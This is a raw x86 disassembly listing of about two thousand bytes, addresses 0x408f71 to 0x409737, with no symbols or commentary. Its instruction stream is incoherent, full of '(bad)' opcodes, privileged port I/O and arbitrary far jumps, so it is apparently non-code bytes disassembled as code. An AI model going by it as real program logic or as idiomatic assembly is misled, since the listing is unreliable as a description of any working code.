  408f71:	pop    ss
  408f72:	cmp    DWORD PTR [edx],0x2f
  408f75:	scas   al,BYTE PTR es:[edi]
  408f76:	push   edi
  408f77:	sbb    ch,dl
  408f79:	scas   eax,DWORD PTR es:[edi]
  408f7a:	in     eax,0xe
  408f7c:	js     0x408f11
  408f7e:	or     DWORD PTR [ebp+0x4cbf3d64],ecx
  408f84:	push   edi
  408f85:	data16 ror BYTE PTR [edi+ebx*2],1
  408f89:	push   edx
  408f8a:	cmp    BYTE PTR fs:[edx],bh
  408f8d:	adc    ebx,DWORD PTR [edx+0x2c]
  408f90:	scas   al,BYTE PTR es:[edi]
  408f91:	lods   eax,DWORD PTR ds:[esi]
  408f92:	pusha  
  408f93:	pop    edi
  408f94:	sbb    DWORD PTR [ecx+ecx*4],esi
  408f97:	push   eax
  408f98:	(bad)  
  408f99:	jmp    0x408fed
  408f9b:	sbb    edx,esi
  408f9d:	pop    edx
  408f9e:	cli    
  408f9f:	retf   
  408fa0:	mov    esi,0xba323789
  408fa5:	xor    bl,al
  408fa7:	or     al,0xbd
  408fa9:	xlat   BYTE PTR ds:[ebx]
  408faa:	fnsave [ecx]
  408fac:	cwde   
  408fad:	and    eax,0x87929601
  408fb2:	sbb    ecx,ebp
  408fb4:	icebp  
  408fb5:	daa    
  408fb6:	(bad)  
  408fb7:	adc    dl,dl
  408fb9:	adc    DWORD PTR [ecx-0x118b577a],edi
  408fbf:	ja     0x408ffe
  408fc1:	into   
  408fc2:	push   esi
  408fc3:	adc    edx,DWORD PTR [ebx-0x7b533ec8]
  408fc9:	in     al,0x11
  408fcb:	test   DWORD PTR [ebx-0x74],esp
  408fce:	ss call 0x9d27e7d5
  408fd4:	cwde   
  408fd5:	cwde   
  408fd6:	dec    esi
  408fd7:	psubsw mm1,mm2
  408fda:	adc    bl,BYTE PTR [edx+0x308c5cfb]
  408fe0:	jb     0x408f81
  408fe2:	cs push 0x2c298a27
  408fe8:	(bad)  
  408fe9:	pop    ebx
  408fea:	xor    dh,al
  408fec:	mov    edx,0xaf88c63a
  408ff1:	xor    ebx,DWORD PTR [eax]
  408ff3:	xchg   BYTE PTR [ebx+0x48031360],dh
  408ff9:	jne    0x409055
  408ffb:	mov    esp,0x2f188c2b
  409000:	scas   al,BYTE PTR es:[edi]
  409001:	add    dh,BYTE PTR [ebp+eiz*2+0x59]
  409005:	aam    0x95
  409007:	jmp    0x409025
  409009:	jge    0x408fed
  40900b:	les    edx,FWORD PTR [ecx]
  40900d:	or     BYTE PTR [edi],0xd0
  409010:	je     0x40904d
  409012:	sbb    esi,edi
  409014:	fisubr DWORD PTR [eax-0x4]
  409017:	das    
  409018:	add    esi,DWORD PTR [ecx]
  40901a:	stos   BYTE PTR es:[edi],al
  40901b:	push   ds
  40901c:	pop    ds
  40901d:	addr16 mov esi,0xb9ec003b
  409023:	lds    esi,FWORD PTR [edi]
  409025:	push   0x18
  409027:	fdivr  DWORD PTR [eax-0x1d2d8f51]
  40902d:	sub    esi,ebp
  40902f:	cmp    DWORD PTR [esi+eiz*1+0x38],esp
  409033:	jne    0x40900e
  409035:	(bad)  
  409036:	test   ah,0x29
  409039:	mov    edi,0x287def85
  40903e:	push   0x4a
  409040:	aam    0x3b
  409042:	or     esp,ebx
  409044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409045:	loopne 0x40904a
  409047:	call   0x2193269b
  40904c:	in     al,0xb6
  40904e:	ins    BYTE PTR es:[edi],dx
  40904f:	cmp    al,bl
  409051:	xor    bl,BYTE PTR [ecx-0x47aacac3]
  409057:	dec    edx
  409058:	nop
  409059:	xchg   esp,eax
  40905a:	push   esp
  40905b:	and    BYTE PTR [edx],bl
  40905d:	or     ebx,eax
  40905f:	retf   0xb8d8
  409062:	lods   al,BYTE PTR ds:[esi]
  409063:	adc    edx,ecx
  409065:	sub    edx,ebp
  409067:	sti    
  409068:	mov    ds:0x56469848,al
  40906d:	jmp    0x54d5:0xac06dca8
  409074:	cmc    
  409075:	fdivr  st,st(0)
  409077:	test   BYTE PTR gs:[eax],ah
  40907a:	push   esp
  40907b:	retf   
  40907c:	push   ebx
  40907d:	pushf  
  40907e:	mov    DWORD PTR [ecx],ecx
  409080:	mov    eax,ds:0x477ae7fc
  409085:	test   BYTE PTR [esi+ebp*4+0x29c6b330],dh
  40908c:	cld    
  40908d:	mov    ebx,0xc48c59fe
  409092:	sub    BYTE PTR [esi+0x3fa4bfa7],dl
  409098:	outs   dx,DWORD PTR ds:[esi]
  409099:	ja     0x4090d9
  40909b:	lods   eax,DWORD PTR ds:[esi]
  40909c:	ja     0x4090d7
  40909e:	daa    
  40909f:	test   al,0x9d
  4090a1:	mov    DWORD PTR [esi-0x14a3544b],edi
  4090a7:	js     0x4090e0
  4090a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090aa:	test   DWORD PTR [eax+0x40],ebp
  4090ad:	lds    eax,FWORD PTR [edi]
  4090af:	cdq    
  4090b0:	xor    BYTE PTR [esi-0x7c73bbf9],0xae
  4090b7:	jle    0x4090c1
  4090b9:	test   DWORD PTR [eax],eax
  4090bb:	sbb    BYTE PTR [edx+0x165e88e8],dl
  4090c1:	add    edi,esi
  4090c3:	or     cl,BYTE PTR [esi+0x653a52e3]
  4090c9:	dec    esi
  4090ca:	mov    BYTE PTR [esi],dh
  4090cc:	ja     0x409092
  4090ce:	out    dx,eax
  4090cf:	jae    0x4090a4
  4090d1:	shr    BYTE PTR [ecx+0x20ed0948],0x6e
  4090d8:	xlat   BYTE PTR ds:[ebx]
  4090d9:	xchg   edx,eax
  4090da:	add    dh,BYTE PTR [esi-0x32c267e7]
  4090e0:	cmp    DWORD PTR [edi-0x7203f997],edx
  4090e6:	int3   
  4090e7:	arpl   sp,cx
  4090e9:	dec    edx
  4090ea:	dec    ecx
  4090eb:	xchg   edi,eax
  4090ec:	je     0x409086
  4090ee:	cmc    
  4090ef:	ins    DWORD PTR es:[edi],dx
  4090f0:	call   0xbdbd:0x497ac947
  4090f7:	cwde   
  4090f8:	or     DWORD PTR [edi],edx
  4090fa:	fs pop ecx
  4090fc:	popf   
  4090fd:	sub    BYTE PTR [esi+0x22],al
  409100:	push   esi
  409101:	fs mov ecx,0xbc38c3b2
  409107:	adc    ah,BYTE PTR [edi+0x57ef3884]
  40910d:	dec    eax
  40910e:	push   ebp
  40910f:	xor    dh,BYTE PTR [ebx-0x50]
  409112:	mov    dh,0xc
  409114:	outs   dx,DWORD PTR ds:[esi]
  409115:	add    edi,ebx
  409117:	lds    eax,FWORD PTR [edi+0x28]
  40911a:	xchg   edi,eax
  40911b:	add    al,0xa4
  40911d:	vmwrite edx,ecx
  409120:	jns    0x4090e1
  409122:	cmp    al,0x6c
  409124:	les    ebx,FWORD PTR [ebx-0x465e8aa]
  40912a:	hlt    
  40912b:	cmp    ebp,DWORD PTR [esi-0x35]
  40912e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40912f:	ds ffree st(1)
  409132:	mov    bh,0xaa
  409134:	mov    eax,0x8b05e114
  409139:	scas   eax,DWORD PTR es:[edi]
  40913a:	adc    DWORD PTR [eax-0x1804c0ca],ebp
  409140:	adc    eax,0xd8a3e593
  409145:	push   ds
  409146:	ret    0xdfd6
  409149:	retf   0x9cf0
  40914c:	dec    esi
  40914d:	pop    esp
  40914e:	pop    ecx
  40914f:	(bad)
  409152:	(bad)  
  409153:	jg     0x409146
  409155:	lds    ecx,FWORD PTR [ebx]
  409157:	clc    
  409158:	aad    0x24
  40915a:	pushf  
  40915b:	inc    esp
  40915c:	sub    cl,bl
  40915e:	xor    eax,DWORD PTR [edi+0x69]
  409161:	data16 adc BYTE PTR [ebp+ebp*2+0x65cc5749],0x8d
  40916a:	rol    ecx,0x0
  40916d:	xchg   ebx,eax
  40916e:	shr    BYTE PTR [edx+0x11a1f2dc],1
  409174:	cmc    
  409175:	retf   
  409176:	(bad)  
  409177:	mov    al,ds:0xb9d4abb3
  40917c:	xor    eax,DWORD PTR [esi-0x37963ff9]
  409182:	fild   DWORD PTR [edi+0x4d647614]
  409188:	jb     0x40915e
  40918a:	and    DWORD PTR [esi-0x7eee0f33],ecx
  409190:	or     ebp,edx
  409192:	xchg   ecx,eax
  409193:	stc    
  409194:	mov    esi,0xb2f02f12
  409199:	out    dx,eax
  40919a:	xchg   ebx,eax
  40919b:	repnz out 0x58,eax
  40919e:	xlat   BYTE PTR ds:[ebx]
  40919f:	fstp   DWORD PTR [eax-0x10]
  4091a2:	xchg   DWORD PTR [edi],esi
  4091a4:	ss pop edi
  4091a6:	adc    ecx,ebp
  4091a8:	sub    BYTE PTR [edx+0x245d745f],bl
  4091ae:	scas   eax,DWORD PTR es:[edi]
  4091af:	fidivr DWORD PTR [esi-0x9]
  4091b2:	repnz repnz sbb eax,0xbfa80f8a
  4091b9:	xlat   BYTE PTR ds:[ebx]
  4091ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091bb:	jmp    0x993a:0xfe6de8de
  4091c2:	adc    edi,ebp
  4091c4:	sub    DWORD PTR [ecx],ebx
  4091c6:	(bad)  
  4091c7:	xor    al,0xf7
  4091c9:	mov    cl,0x47
  4091cb:	and    al,0x1a
  4091cd:	dec    eax
  4091ce:	out    0x5e,eax
  4091d0:	popf   
  4091d1:	jb     0x4091c9
  4091d3:	shl    cl,0x51
  4091d6:	stos   DWORD PTR es:[edi],eax
  4091d7:	repz icebp 
  4091d9:	cmp    eax,0x7b2ea2e7
  4091de:	xor    cl,BYTE PTR [ebx+esi*2+0x6ff76330]
  4091e5:	dec    edi
  4091e6:	mov    dl,0x6
  4091e8:	mov    bl,bl
  4091ea:	mov    ch,0x34
  4091ec:	inc    si
  4091ee:	xor    BYTE PTR [ecx],bl
  4091f0:	rcr    ecx,1
  4091f2:	mov    eax,ds:0xa6fae06e
  4091f7:	pop    ds
  4091f8:	in     eax,dx
  4091f9:	and    DWORD PTR ds:0x95486281,edi
  4091ff:	fs cmp al,0xca
  409202:	in     al,dx
  409203:	idiv   DWORD PTR [edx+0x23]
  409206:	jmp    0xfe1eb30
  40920b:	jne    0x40920f
  40920d:	xchg   DWORD PTR [esi],edi
  40920f:	fstp   DWORD PTR [edx]
  409211:	dec    edx
  409212:	or     eax,0x8e2a488b
  409217:	and    cl,BYTE PTR [ebp-0xc]
  40921a:	mov    ebx,0x960267fa
  40921f:	xchg   edx,eax
  409220:	xchg   ecx,eax
  409221:	int3   
  409222:	fisttp DWORD PTR [ebp+0x23]
  409225:	cld    
  409226:	daa    
  409227:	pop    ecx
  409228:	pop    ds
  409229:	mov    ebp,0x463177df
  40922e:	bound  ebp,QWORD PTR [bp+si-0x25]
  409232:	dec    edx
  409233:	imul   edx,DWORD PTR [eax-0x75],0xffffffaf
  409237:	xchg   ecx,eax
  409238:	jae    0x4092a0
  40923a:	hlt    
  40923b:	push   esi
  40923c:	inc    ecx
  40923d:	and    eax,0x75aba920
  409242:	dec    eax
  409243:	xchg   esi,eax
  409244:	int    0x5e
  409246:	(bad)  
  409248:	js     0x4091d9
  40924a:	out    dx,eax
  40924b:	and    al,0x9
  40924d:	jecxz  0x409256
  40924f:	mov    ecx,0x7ca9c0f8
  409254:	outs   dx,BYTE PTR ds:[esi]
  409255:	add    eax,0xa850cff7
  40925a:	sbb    al,0x6b
  40925c:	shl    BYTE PTR [esi+0x18],cl
  40925f:	fscale 
  409261:	enter  0xe953,0x5
  409265:	mov    dl,0x15
  409267:	std    
  409268:	adc    al,0xe
  40926a:	mov    al,ds:0xf174274e
  40926f:	dec    eax
  409270:	popf   
  409271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409272:	cmp    DWORD PTR [ebx],eax
  409274:	add    esp,ebp
  409276:	xchg   edx,eax
  409277:	pop    edx
  409278:	call   0xaf:0xd4c7f7d
  40927f:	push   esi
  409280:	fist   WORD PTR ds:0x123539ab
  409286:	das    
  409287:	je     0x40928f
  409289:	out    dx,al
  40928a:	out    0xec,eax
  40928c:	(bad)  
  40928e:	sub    al,ch
  409290:	and    eax,DWORD PTR [esi-0x3c]
  409293:	pop    eax
  409294:	xchg   edx,eax
  409295:	out    0xc6,al
  409297:	xchg   edi,ecx
  409299:	je     0x4092ce
  40929b:	mov    BYTE PTR [ebx],0x35
  40929e:	jno    0x40928c
  4092a0:	jl     0x4092c2
  4092a2:	cmp    BYTE PTR [edi],bl
  4092a4:	jo     0x409287
  4092a6:	addr16 jbe 0x40926b
  4092a9:	in     eax,0x86
  4092ab:	xor    cl,BYTE PTR ds:0x61f60c46
  4092b1:	jb     0x40927c
  4092b3:	inc    esi
  4092b4:	adc    al,0x59
  4092b6:	dec    ebp
  4092b7:	loop   0x409274
  4092b9:	mov    al,ds:0xd957b6b3
  4092be:	sbb    al,0xb5
  4092c0:	icebp  
  4092c1:	ja     0x4092ae
  4092c3:	jnp    0x4092a7
  4092c5:	repz sub eax,0x743570b2
  4092cb:	push   cs
  4092cc:	pop    ds
  4092cd:	fs ss repnz or eax,0x9df0ae1b
  4092d5:	shr    DWORD PTR [esi],1
  4092d7:	fsubp  st(4),st
  4092d9:	dec    ebx
  4092da:	ds xor al,0x35
  4092dd:	(bad)  
  4092de:	loopne 0x4092a6
  4092e0:	in     al,0x8c
  4092e2:	adc    al,bl
  4092e4:	mov    esi,0xb64b854e
  4092e9:	in     eax,dx
  4092ea:	pop    es
  4092eb:	mov    esi,0x91f32bd9
  4092f0:	pop    ecx
  4092f1:	and    bh,ah
  4092f3:	xor    eax,0xb5e14749
  4092f8:	ja     0x4092ce
  4092fa:	and    BYTE PTR [ecx+0x2],ah
  4092fd:	jb     0x409280
  4092ff:	sbb    DWORD PTR [edx],ebx
  409301:	stc    
  409302:	hlt    
  409303:	jb     0x409325
  409305:	rcl    BYTE PTR [edx],1
  409307:	repnz xchg esi,eax
  409309:	push   ebp
  40930a:	out    0xb8,eax
  40930c:	ins    BYTE PTR es:[edi],dx
  40930d:	shr    DWORD PTR [esi+0x6],1
  409310:	loopne 0x409342
  409312:	mov    edx,0x7f24cc7
  409317:	paddd  mm0,mm4
  40931a:	pusha  
  40931b:	jo     0x4092ef
  40931d:	lea    esi,[ebp+0x1e6b7a7a]
  409323:	daa    
  409324:	and    al,0xde
  409326:	adc    al,0x48
  409328:	pop    ss
  409329:	pop    ecx
  40932a:	jmp    0x40931f
  40932c:	std    
  40932d:	inc    esi
  40932e:	das    
  40932f:	jo     0x40934f
  409331:	mov    ss,WORD PTR [esi+0xa84e524]
  409337:	and    al,0x25
  409339:	out    0x6f,eax
  40933b:	mov    al,0x30
  40933d:	cmp    eax,0xe3fbae93
  409342:	test   eax,0x1f8c942d
  409347:	std    
  409348:	mov    ds:0x35e68a4a,eax
  40934d:	jmp    0x40932c
  40934f:	and    BYTE PTR [ebx+eiz*1],bh
  409352:	sbb    BYTE PTR [eax+0x68],cl
  409355:	inc    ebp
  409356:	stos   BYTE PTR es:[edi],al
  409357:	loopne 0x409390
  409359:	das    
  40935a:	xchg   edx,eax
  40935b:	adc    BYTE PTR [eax+edx*1],ch
  40935e:	pop    ecx
  40935f:	test   BYTE PTR [esi],bl
  409361:	dec    ecx
  409362:	or     eax,0x9f340417
  409367:	pop    ebx
  409368:	inc    edx
  409369:	push   ebx
  40936a:	ins    DWORD PTR es:[edi],dx
  40936b:	loopne 0x409348
  40936d:	adc    esi,DWORD PTR [edx-0x25f10f06]
  409373:	arpl   WORD PTR [edi+0x58d43aad],bx
  409379:	clc    
  40937a:	js     0x4093ca
  40937c:	shr    DWORD PTR [eax-0x12],1
  40937f:	xor    DWORD PTR [esi-0x6c],eax
  409382:	jmp    0xbef4:0xa6bb1e5e
  409389:	inc    edx
  40938a:	(bad)  
  40938b:	pop    ss
  40938c:	xchg   edi,eax
  40938d:	addr16 popa 
  40938f:	test   BYTE PTR [edi-0x33058b8c],ch
  409395:	push   0x846359bd
  40939a:	xchg   ebx,eax
  40939b:	pop    esi
  40939c:	fnstcw WORD PTR [ecx+0x575554ca]
  4093a2:	gs sbb al,0x3d
  4093a5:	dec    ebp
  4093a6:	popf   
  4093a7:	cli    
  4093a8:	stc    
  4093a9:	ret    
  4093aa:	cld    
  4093ab:	jge    0x4093bc
  4093ad:	(bad)  
  4093af:	push   edi
  4093b0:	outs   dx,DWORD PTR ds:[esi]
  4093b1:	xchg   edx,eax
  4093b2:	cmp    eax,eax
  4093b4:	test   BYTE PTR ss:[edx],bl
  4093b7:	hlt    
  4093b8:	fsub   QWORD PTR [edx+0x614c2097]
  4093be:	in     al,0x8b
  4093c0:	push   ss
  4093c1:	cmp    eax,0xe4ab1089
  4093c6:	jb     0x409365
  4093c8:	and    esi,edx
  4093ca:	cwde   
  4093cb:	jl     0x40938a
  4093cd:	test   DWORD PTR ds:0x28b5417e,ecx
  4093d3:	(bad)  
  4093d4:	fcom   DWORD PTR [edi+0x1d]
  4093d7:	aam    0xb5
  4093d9:	scas   al,BYTE PTR es:[edi]
  4093da:	ins    DWORD PTR es:[edi],dx
  4093db:	dec    ebx
  4093dc:	test   ch,dl
  4093de:	mov    ecx,0xa1cf43d3
  4093e3:	xchg   esi,eax
  4093e4:	cmp    bl,BYTE PTR [edx]
  4093e6:	sbb    al,0x2f
  4093e8:	idiv   eax
  4093ea:	pop    esi
  4093eb:	pop    edi
  4093ec:	inc    ecx
  4093ed:	xchg   edx,eax
  4093ee:	dec    edi
  4093ef:	icebp  
  4093f0:	mov    dl,0xc8
  4093f2:	fist   WORD PTR [ebp-0x57]
  4093f5:	loope  0x409452
  4093f7:	xor    esp,DWORD PTR [esi+0x6a]
  4093fa:	pop    ecx
  4093fb:	in     al,dx
  4093fc:	inc    ecx
  4093fd:	adc    edi,DWORD PTR [ebp-0x21]
  409400:	enter  0x77a3,0x8a
  409404:	or     eax,0x45ab8d10
  409409:	fsub   DWORD PTR [edi+0x4aa4f9a7]
  40940f:	scas   eax,DWORD PTR es:[edi]
  409410:	mov    ah,0x61
  409412:	sub    DWORD PTR [edi+edx*8],edx
  409415:	mov    bl,0xda
  409417:	fstp   DWORD PTR [ebp+0x5eb9f574]
  40941d:	mov    ah,0x8
  40941f:	fistp  QWORD PTR [ecx]
  409421:	mov    ch,0x87
  409423:	(bad)  
  409424:	push   cs
  409425:	pop    es
  409426:	mov    eax,0xcda7975f
  40942b:	fnsave ds:0xa842309d
  409431:	pusha  
  409432:	push   0xfffffff1
  409434:	pop    ss
  409435:	(bad)  
  409436:	bound  edi,QWORD PTR ds:0xb0a5dcb7
  40943c:	rcl    BYTE PTR [edx],1
  40943e:	jg     0x4093db
  409440:	inc    DWORD PTR [eax-0x314c7e]
  409446:	pop    ds
  409447:	pusha  
  409448:	cmp    BYTE PTR [esi+0x58],cl
  40944b:	hlt    
  40944c:	loop   0x4093dd
  40944e:	mov    edx,0xa6cc39f4
  409453:	test   BYTE PTR [ecx-0x300a5bf1],0x5e
  40945a:	jmp    0xd6788806
  40945f:	cwde   
  409460:	loopne 0x40947c
  409462:	es pop es
  409464:	ss scas al,BYTE PTR es:[edi]
  409466:	mov    ecx,0x69f49837
  40946b:	jae    0x4094c1
  40946d:	stos   BYTE PTR es:[edi],al
  40946e:	and    al,0x9b
  409470:	mov    edx,0x1f8a094c
  409475:	or     BYTE PTR [eax-0x5b],al
  409478:	das    
  409479:	inc    esp
  40947a:	mov    WORD PTR [ecx-0x7d2b2fd2],ds
  409480:	xor    BYTE PTR ds:0x15864961,0x93
  409487:	(bad)
  40948b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40948c:	popa   
  40948d:	mov    WORD PTR [edi-0x23031f80],ds
  409493:	mov    dl,0x3e
  409495:	or     DWORD PTR [edi],0x3f51d495
  40949b:	dec    esi
  40949c:	mov    ch,BYTE PTR [edx-0x59921e4b]
  4094a2:	jno    0x40951d
  4094a4:	jecxz  0x409487
  4094a6:	cdq    
  4094a7:	addr16 sahf 
  4094a9:	mov    edi,DWORD PTR [esi-0x47151d28]
  4094af:	adc    DWORD PTR [esi-0x16c64b0f],eax
  4094b5:	push   ds
  4094b6:	stos   DWORD PTR es:[edi],eax
  4094b7:	pop    eax
  4094b8:	inc    ebp
  4094b9:	cmp    DWORD PTR [esi-0x1a],edi
  4094bc:	test   ecx,eax
  4094be:	in     al,0x37
  4094c0:	int    0x7
  4094c2:	and    al,0xe
  4094c4:	pushf  
  4094c5:	mov    edi,ecx
  4094c7:	pop    ebx
  4094c8:	and    eax,0xe2906dc2
  4094cd:	push   esp
  4094ce:	call   0xf2c7:0x64f0ed4d
  4094d5:	test   al,0x2
  4094d7:	imul   DWORD PTR [ebp-0x2ffa2d9]
  4094dd:	mov    ds:0x1bfa8cf7,eax
  4094e2:	aas    
  4094e3:	in     eax,dx
  4094e4:	xchg   ebp,eax
  4094e5:	push   eax
  4094e6:	std    
  4094e7:	ss clc 
  4094e9:	sub    eax,ecx
  4094eb:	hlt    
  4094ec:	dec    edi
  4094ed:	es xor dl,bh
  4094f0:	mov    ebp,0x58c85e5c
  4094f5:	fist   WORD PTR [eax]
  4094f7:	xor    eax,0xa7c573a7
  4094fc:	or     ebp,0x75
  4094ff:	and    ah,0xf2
  409502:	or     bh,BYTE PTR [ebx+ecx*1+0x5bf9e277]
  409509:	pop    ds
  40950a:	pop    ebp
  40950b:	sbb    eax,0xa6878a56
  409510:	pop    ss
  409511:	je     0x40954d
  409513:	es dec di
  409516:	or     BYTE PTR gs:[ebx-0x29],cl
  40951a:	mov    ebp,0x4d884a5f
  40951f:	inc    esp
  409520:	sbb    eax,DWORD PTR [edx+0x4c]
  409523:	jnp    0x409582
  409525:	js     0x40954a
  409527:	jb     0x40950a
  409529:	inc    eax
  40952a:	push   ecx
  40952b:	(bad)  
  40952c:	pushf  
  40952d:	sbb    DWORD PTR [ebx-0x52],esi
  409530:	aam    0xfd
  409532:	xchg   ecx,eax
  409533:	cmp    eax,0x702b92a9
  409538:	push   DWORD PTR [edi]
  40953a:	dec    edi
  40953b:	es (bad) 
  40953d:	pop    eax
  40953e:	dec    esi
  40953f:	or     edi,esi
  409541:	arpl   WORD PTR [edx],ax
  409543:	cdq    
  409544:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409545:	push   0x9d0b8f4f
  40954a:	pop    edi
  40954b:	dec    edi
  40954c:	fldenv [esi]
  40954e:	lods   al,BYTE PTR ds:[esi]
  40954f:	inc    esp
  409550:	and    dh,cl
  409552:	scas   al,BYTE PTR es:[edi]
  409553:	pushf  
  409554:	lods   al,BYTE PTR ds:[esi]
  409555:	mov    esi,0x13ec4331
  40955a:	add    al,0x75
  40955c:	in     eax,dx
  40955d:	xor    bh,cl
  40955f:	jp     0x40955f
  409561:	cmp    al,BYTE PTR [eax]
  409563:	mov    edx,0xbe07996d
  409568:	fisubr WORD PTR [eax+0x1d]
  40956b:	cmp    bl,dh
  40956d:	fst    QWORD PTR [ebx+0x645bbfe1]
  409573:	in     eax,dx
  409574:	fcmovne st,st(2)
  409576:	adc    edi,DWORD PTR [esi+0x7db20b90]
  40957c:	pop    ss
  40957d:	lahf   
  40957e:	shl    dl,cl
  409580:	lea    esi,[edi+ecx*1-0x66c46100]
  409587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409588:	inc    DWORD PTR [ebp+0x688f31fa]
  40958e:	cmp    eax,ecx
  409590:	test   BYTE PTR [ecx],al
  409592:	push   cs
  409593:	mov    BYTE PTR [ecx],bh
  409595:	mov    ch,0x6f
  409597:	aad    0x68
  409599:	pop    ebp
  40959a:	xchg   esi,eax
  40959b:	xchg   ebx,eax
  40959c:	mov    al,ds:0x244d46c4
  4095a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095a2:	inc    eax
  4095a3:	pop    ebx
  4095a4:	xor    ch,BYTE PTR [edx-0x6e]
  4095a7:	xchg   ecx,eax
  4095a8:	cmc    
  4095a9:	ss push 0x34edb214
  4095af:	xchg   ebp,eax
  4095b0:	inc    eax
  4095b1:	cmp    eax,0xaed6598c
  4095b6:	popf   
  4095b7:	or     eax,0x100d8407
  4095bc:	ins    BYTE PTR es:[edi],dx
  4095bd:	aam    0x95
  4095bf:	cmp    eax,0xf1e8954c
  4095c4:	aas    
  4095c5:	jmp    0x86660596
  4095ca:	pop    ebp
  4095cb:	lods   eax,DWORD PTR ds:[esi]
  4095cc:	or     BYTE PTR [edi+0x1b],al
  4095cf:	rcl    DWORD PTR [ecx+0xb],1
  4095d2:	xor    ch,bl
  4095d4:	or     eax,0x4757764f
  4095d9:	repz test eax,0x8b719d79
  4095df:	jp     0x4095c0
  4095e1:	jg     0x409605
  4095e3:	mov    esp,0x5e7ea7dd
  4095e8:	das    
  4095e9:	jle    0x40964d
  4095eb:	scas   eax,DWORD PTR es:[edi]
  4095ec:	stos   BYTE PTR es:[edi],al
  4095ed:	sahf   
  4095ee:	test   al,0xc1
  4095f0:	stos   BYTE PTR es:[edi],al
  4095f1:	sahf   
  4095f2:	jae    0x4095a8
  4095f4:	jns    0x409621
  4095f6:	mov    edx,0xe71eeb1
  4095fb:	fs je  0x40964c
  4095fe:	out    0x84,eax
  409600:	sti    
  409601:	dec    esi
  409602:	outs   dx,BYTE PTR ds:[esi]
  409603:	or     DWORD PTR [ecx+0x3b],esp
  409606:	mov    dl,0x63
  409608:	int    0xf6
  40960a:	scas   al,BYTE PTR es:[edi]
  40960b:	inc    edi
  40960c:	or     cl,BYTE PTR [edx]
  40960e:	je     0x40967a
  409610:	popa   
  409611:	retf   0x5e08
  409614:	sub    eax,eax
  409616:	jp     0x40965b
  409618:	sbb    cl,BYTE PTR [ecx]
  40961a:	mov    dh,0xe4
  40961c:	mov    cl,0xcf
  40961e:	aaa    
  40961f:	xchg   esp,eax
  409620:	retf   
  409621:	xchg   edx,eax
  409622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409623:	mov    ecx,0xe628623d
  409628:	pop    edx
  409629:	dec    edi
  40962a:	imul   ebp,DWORD PTR [ecx+ebp*4-0x40],0x1de3acb7
  409632:	and    bh,0x3
  409635:	test   DWORD PTR [ecx+edi*8],edx
  409638:	loop   0x409669
  40963a:	leave  
  40963b:	jno    0x40963b
  40963d:	mov    esp,0x156ec089
  409642:	scas   eax,DWORD PTR es:[edi]
  409643:	fsubr  st,st(7)
  409645:	sbb    al,0x81
  409647:	mov    al,ds:0x6d08749c
  40964c:	jle    0x409604
  40964e:	jne    0x4095df
  409650:	cmp    eax,0x58c82301
  409655:	jmp    0xd5939d57
  40965a:	shl    BYTE PTR [ecx+ecx*4+0x7c94ee98],cl
  409661:	scas   al,BYTE PTR es:[edi]
  409662:	out    0x42,al
  409664:	cmc    
  409665:	jb     0x4096ab
  409667:	imul   ebp,DWORD PTR [edi+0x69d31575],0x61
  40966e:	adc    ebp,DWORD PTR es:[esi+edx*1]
  409672:	xchg   esp,eax
  409673:	cmp    BYTE PTR [eax+0x12ecb2ce],0xeb
  40967a:	nop
  40967b:	adc    DWORD PTR [esi+0x1b],ebx
  40967e:	adc    bh,BYTE PTR [edi+eiz*1+0x3e11d15f]
  409685:	(bad)
  409688:	pop    esi
  409689:	aas    
  40968a:	and    DWORD PTR [edi-0x2e],0xedc5d1ac
  409691:	das    
  409692:	jo     0x40968b
  409694:	mov    eax,gs
  409696:	push   0x8e3481ef
  40969b:	leave  
  40969c:	xchg   esp,eax
  40969d:	lahf   
  40969e:	mov    al,ds:0xcec850c
  4096a3:	(bad)  
  4096a6:	test   ebp,ebp
  4096a8:	lahf   
  4096a9:	jg     0x40972a
  4096ab:	(bad)  
  4096ac:	cs xchg esi,eax
  4096ae:	test   eax,0xfe356a4d
  4096b3:	je     0x4096f1
  4096b5:	call   DWORD PTR [eax]
  4096b7:	call   0x2c5d:0x9458f004
  4096be:	and    DWORD PTR [ebx-0x434eef69],0x3c
  4096c5:	imul   eax,DWORD PTR [ecx+0x76],0xcc459cbe
  4096cc:	addr16 test al,0xbf
  4096cf:	hlt    
  4096d0:	adc    ah,dh
  4096d2:	xor    eax,0xd59cd377
  4096d7:	dec    esp
  4096d8:	outs   dx,BYTE PTR ds:[esi]
  4096d9:	scas   al,BYTE PTR es:[edi]
  4096da:	retf   
  4096db:	cli    
  4096dc:	sub    ecx,DWORD PTR [ebp-0x1cbd1a9f]
  4096e2:	aam    0xb5
  4096e4:	aas    
  4096e5:	lods   al,BYTE PTR ds:[esi]
  4096e6:	iret   
  4096e7:	xchg   ebp,eax
  4096e8:	lods   al,BYTE PTR ds:[esi]
  4096e9:	jge    0x4096e7
  4096eb:	sbb    eax,0x7feff197
  4096f0:	xor    esi,eax
  4096f2:	mov    WORD PTR [ecx-0x75],es
  4096f5:	repnz retf 
  4096f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096f8:	shr    dh,0x49
  4096fb:	test   BYTE PTR [edx],bl
  4096fd:	and    bl,BYTE PTR [eax]
  4096ff:	mov    bh,0xe0
  409701:	cmp    eax,DWORD PTR [ebx+0x17]
  409704:	push   ecx
  409705:	lods   al,BYTE PTR ds:[esi]
  409706:	aas    
  409707:	aaa    
  409708:	adc    edi,edx
  40970a:	ds stc 
  40970c:	dec    eax
  40970d:	cmp    eax,0x7cb24e48
  409712:	sbb    eax,0x3818f006
  409717:	push   eax
  409718:	cs enter 0x1fc4,0x83
  40971d:	mov    eax,0x70ccf7a7
  409722:	shr    BYTE PTR [edx+ecx*2],cl
  409725:	rol    BYTE PTR [edi],0xc6
  409728:	mov    dl,0x66
  40972a:	pop    ebx
  40972b:	sbb    eax,0x5b6fe827
  409730:	push   es
  409731:	adc    esi,0xffffff98
  409734:	cmp    BYTE PTR [edi],dl
  409736:	dec    esi
  409737:	jnp    0x4096ee
